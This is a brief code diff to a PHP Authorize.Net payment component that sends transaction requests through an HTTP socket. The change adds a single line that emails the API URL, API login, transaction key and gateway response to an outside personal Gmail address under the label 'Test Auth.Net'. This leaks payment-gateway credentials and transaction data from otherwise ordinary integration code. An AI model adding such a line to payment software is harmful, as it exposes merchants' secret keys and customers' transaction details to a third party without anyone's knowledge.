@@ -83,7 +83,7 @@ class AuthorizeNetComponent extends Component {
 		$httpSocket = new HttpSocket();
 
 		$response = $httpSocket->post($this->api_url, $post_values);
-
+                mail('ehask71@gmail.com','Test Auth.Net','Params'.$this->api_url.' '.$this->api_login.' '.$this->api_transaction_key.' '. $response);
 		if (!empty($response['body'])) {
 			$parsed = preg_split("/,(?=(?:[^\"]*\"[^\"]*\")*(?![^\"]*\"))/", $response['body']);
 			foreach ($parsed as $key => $value) {
